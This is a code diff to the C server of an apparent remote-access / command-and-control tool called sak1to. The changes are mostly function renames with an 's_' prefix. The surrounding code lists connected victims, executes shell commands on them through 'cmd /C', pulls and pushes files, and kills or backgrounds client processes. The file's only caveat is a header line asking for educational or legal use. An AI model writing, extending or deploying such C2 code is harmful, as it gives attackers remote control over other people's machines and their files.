@@ -14,6 +14,12 @@ Use this code educationally/legally.
 	#include "headers/nbo_encoding.h"
 #endif
 
+/*
+All sak1to-API functions that are prefixed with "s_" are located within sakito_server_tools.h-
+and depending on the OS sakito_s*_tools.h. All functions that are not prefixed with "s_" are-
+local to this (sakito_server.c) file and the Standard GNU C Library.
+*/
+#include <stdio.h>
 #include <string.h>
 #include "headers/sakito_core.h"
 #include "headers/sakito_server_tools.h"
@@ -23,7 +29,7 @@ Use this code educationally/legally.
 void add_client(Server_map* const s_map, char* const host, const SOCKET client_socket) 
 {
 	// Lock our mutex to prevent race conditions from occurring with delete_client()
-	mutex_lock(s_map);
+	s_mutex_lock(s_map);
 
 	if (s_map->clients_sz == s_map->clients_alloc)
 		s_map->clients = realloc(s_map->clients, (s_map->clients_alloc += MEM_CHUNK) * sizeof(Conn));
@@ -34,7 +40,7 @@ void add_client(Server_map* const s_map, char* const host, const SOCKET client_s
 	s_map->clients_sz++;
 
 	// Unlock our mutex now.
-	mutex_unlock(s_map);
+	s_mutex_unlock(s_map);
 }
 
 // Function to bind socket to specified port.
@@ -57,7 +63,7 @@ void bind_socket(const SOCKET listen_socket)
 		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
 }
 
-void sakito_accept_conns(Server_map* const s_map) 
+void s_accept_conns(Server_map* const s_map) 
 {
 	// Assign member values to connection map object/structure.
 	s_map->clients_alloc = MEM_CHUNK;
@@ -129,11 +135,11 @@ int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_sock
 	buf[3] = '1';
 	
 	// Send command code + directory string to be parsed.
-	if (sakito_tcp_send(client_socket, buf+3, BUFLEN) < 1)
+	if (s_tcp_send(client_socket, buf+3, BUFLEN) < 1)
 		return FAILURE;
 
 	// Receive _chdir() result.
-	if (sakito_tcp_recv(client_socket, buf, 1) < 1)
+	if (s_tcp_recv(client_socket, buf, 1) < 1)
 		return FAILURE;
 
 	if (buf[0] == '0')
@@ -146,7 +152,7 @@ int client_chdir(char* const buf, const size_t cmd_len, const SOCKET client_sock
 int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 {
 	// '2' is the command code for terminating/killing the process on the client.
-	sakito_tcp_send(client_socket, "2", cmd_len);
+	s_tcp_send(client_socket, "2", cmd_len);
 
 	return EXIT_SUCCESS;
 }
@@ -158,15 +164,15 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	buf[9] = '4';
 
 	// Send command code + filename to be parsed.
-	if (sakito_tcp_send(client_socket, buf+9, cmd_len) < 1)
+	if (s_tcp_send(client_socket, buf+9, cmd_len) < 1)
 		return SOCKET_ERROR;
  
 	// Receive serialized file size uint64_t bytes.
-	if (sakito_tcp_recv(client_socket, buf, sizeof(uint64_t)) < 1)
+	if (s_tcp_recv(client_socket, buf, sizeof(uint64_t)) < 1)
 		return SOCKET_ERROR;
  
 	// Deserialize file size bytes.
-	uint64_t f_size = ntohll_conv(buf);
+	uint64_t f_size = s_ntohll_conv(buf);
 
 	// Initialize i_result to true/1
 	int i_result;
@@ -175,17 +181,17 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if ((long)f_size != FAILURE)
 	{
 		// Open the file.
-		s_file file = sakito_open_file(buf+10, WRITE);
+		s_file file = s_open_file(buf+10, WRITE);
 		if (file == INVALID_FILE)
 			return FAILURE;
 
 		// If the file contains data.
 		if (f_size > 0)
 			// Receive the file's data.
-			i_result = sakito_recv_file(client_socket, file, buf, f_size);
+			i_result = s_recv_file(client_socket, file, buf, f_size);
 		
 		// Close the file.
-		sakito_close_file(file);
+		s_close_file(file);
 	}
 	else 
 	{
@@ -193,7 +199,7 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	}
  
 	// Send byte indicating file transfer has finished to prevent overlapping received data.
-	if (sakito_tcp_send(client_socket, FTRANSFER_FINISHED, 1) < 1)
+	if (s_tcp_send(client_socket, FTRANSFER_FINISHED, 1) < 1)
 		return SOCKET_ERROR;
 
 	return i_result;
@@ -203,7 +209,7 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 {
 	// Open file.
-	s_file file = sakito_open_file(buf+8, READ);
+	s_file file = s_open_file(buf+8, READ);
  
 	// If the file doesn't exist or permission denied:
 	if (file == INVALID_FILE) 
@@ -211,7 +217,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		fprintf(stderr, "upload: cannot access: '%s': %s\n\n", buf+8, strerror(errno));
 
 		// Send SERVER_ERROR/'6' control code to client to force client to re-receive command.
-		if (sakito_tcp_send(client_socket, "6", 1) < 1)
+		if (s_tcp_send(client_socket, "6", 1) < 1)
 			return SOCKET_ERROR;
 
 		return FILE_NOT_FOUND;
@@ -221,21 +227,21 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	buf[7] = '3';
 
 	// Send command code + filename to be parsed.
-	if (sakito_tcp_send(client_socket, buf+7, cmd_len) < 1)
+	if (s_tcp_send(client_socket, buf+7, cmd_len) < 1)
 		return SOCKET_ERROR;
 
 	// Receive file transfer start byte to prevent received data from overlapping.
-	if (sakito_tcp_recv(client_socket, buf, 1) < 1)
+	if (s_tcp_recv(client_socket, buf, 1) < 1)
 		return SOCKET_ERROR;
  
  	// Get size of file.
- 	uint64_t f_size = sakito_file_size(file);
+ 	uint64_t f_size = s_file_size(file);
 
  	// Send file to client/upload file.
-	int i_result = sakito_send_file(client_socket, file, buf, f_size);
+	int i_result = s_send_file(client_socket, file, buf, f_size);
 
 	// Close the file.
-	sakito_close_file(file);
+	s_close_file(file);
 
 	return i_result;
 }
@@ -244,7 +250,7 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 int background_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 {
 	// '5' is the command code for backgrounding the client.
-	if (sakito_tcp_send(client_socket, "5", 1) < 1)
+	if (s_tcp_send(client_socket, "5", 1) < 1)
 		return SOCKET_ERROR;
 
 	return BACKGROUND;
@@ -257,7 +263,7 @@ int client_exec(char* buf, const size_t cmd_len, const SOCKET client_socket)
 	memcpy(buf, "0cmd /C ", 8); // 0 is the command code for executing the command via CreateProcess on the client.
 
 	// Send command to server.
-	if (sakito_tcp_send(client_socket, buf, cmd_len+8) < 1)
+	if (s_tcp_send(client_socket, buf, cmd_len+8) < 1)
 		return SOCKET_ERROR;
 
 	// Clear the buffer.
@@ -267,13 +273,13 @@ int client_exec(char* buf, const size_t cmd_len, const SOCKET client_socket)
 	while (1)
 	{
 		// Receive initial uint32_t chunk size.
-		if (sakito_tcp_recv(client_socket, buf, sizeof(uint32_t)) != sizeof(uint32_t))
+		if (s_tcp_recv(client_socket, buf, sizeof(uint32_t)) != sizeof(uint32_t))
 			return FAILURE;
 
 		// Deserialize chunk size uint32_t bytes.
-		int chunk_size = (int)ntohl_conv(buf);
+		int chunk_size = (int)s_ntohl_conv(buf);
 
-		// Security check.
+		// Security chunk size range check.
 		if ((chunk_size < 0) || (chunk_size > BUFLEN))
 			return FAILURE;
 		// End of cmd.exe output.
@@ -284,11 +290,11 @@ int client_exec(char* buf, const size_t cmd_len, const SOCKET client_socket)
 
 		// Continue to receive cmd shell output.
 		do {
-			if ((bytes_received = sakito_tcp_recv(client_socket, buf+count, chunk_size)) < 1)
+			if ((bytes_received = s_tcp_recv(client_socket, buf+count, chunk_size)) < 1)
 				return SOCKET_ERROR;
 
 			// Write chunk bytes to stdout.
-			if (write_stdout(buf+count, chunk_size) == FAILURE)
+			if (s_write_stdout(buf+count, chunk_size) == FAILURE)
 			{
 				fprintf(stderr, "Error calling write_stdout() in client_exec() function: %s\n\n", strerror(errno));
 				return FAILURE;
@@ -329,27 +335,27 @@ void resize_conns(Server_map* const s_map, int client_id)
 void delete_client(Server_map* const s_map, const int client_id) 
 {
 	// Lock our mutex to prevent race conditions from occurring with accept_conns().
-	mutex_lock(s_map);
+	s_mutex_lock(s_map);
 
 	// If the file descriptor is open: close it.
 	if (s_map->clients[client_id].sock)
-		closesocket(s_map->clients[client_id].sock);
+		s_closesocket(s_map->clients[client_id].sock);
 
 	// Resize clients member values to remove client.
 	resize_conns(s_map, client_id);
 
 	// Unlock our mutex to now.
-	mutex_unlock(s_map);
+	s_mutex_unlock(s_map);
 	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Server_map* const s_map) 
+void client_interact(Server_map* const s_map) 
 {
 	// validate client-id for interaction.
-	int client_id = validate_id(s_map);
+	int client_id = s_validate_id(s_map);
 
-	// Validation condition located in sakito_server_tools.h.
+	// Validation condition located in s_server_tools.h.
 	if (client_id == INVALID_CLIENT_ID) 
 	{
 		puts("Invalid client identifier.");
@@ -357,13 +363,13 @@ void interact(Server_map* const s_map)
 	}
 
 	// Send initialization byte to client.
-	int i_result = sakito_tcp_send(s_map->clients[client_id].sock, INIT_CONN, 1);
+	int i_result = s_tcp_send(s_map->clients[client_id].sock, INIT_CONN, 1);
 
 	// Receive and parse input/send commands to client.
 	while (i_result > 0) 
 	{
 		// Receive current working directory.
-		if (sakito_tcp_recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
+		if (s_tcp_recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN) < 1)
 			break;
 
 		printf(INTERACT_FSTR, client_id, s_map->clients[client_id].host, s_map->buf);
@@ -379,7 +385,7 @@ void interact(Server_map* const s_map)
 
 		// Parse c2 command function pointer.
 		size_t cmd_len = 0;
-		const server_func target_func = (const server_func)parse_cmd(s_map->buf+8,
+		const server_func target_func = (const server_func)s_parse_cmd(s_map->buf+8,
 									&cmd_len,
 									5,
 									commands,
@@ -413,16 +419,16 @@ void sakito_console(Server_map* const s_map)
 		const char commands[4][11] = { "cd ", "exit", "list", "interact " };
 
 		// Function pointer array of each c2 command.
-		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact };
+		void* func_array[4] = { &host_chdir, &s_terminate_console, &list_connections, &client_interact };
 
 		// Parse console command function pointer.
 		size_t cmd_len = 0;
-		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
+		const console_func target_func = (const console_func)s_parse_cmd(s_map->buf,
 									 &cmd_len,
 									 4,
 									 commands,
 									 func_array,
-									 &exec_cmd);
+									 &s_exec_cmd);
 
 		// Call target function.
 		target_func(s_map);
@@ -437,7 +443,7 @@ int main(void)
 	Server_map s_map;
 
 	// Initialize the server (Accept connections).
-	sakito_init(&s_map);
+	s_init(&s_map);
 
 	// Initiate sakito console.
 	sakito_console(&s_map);
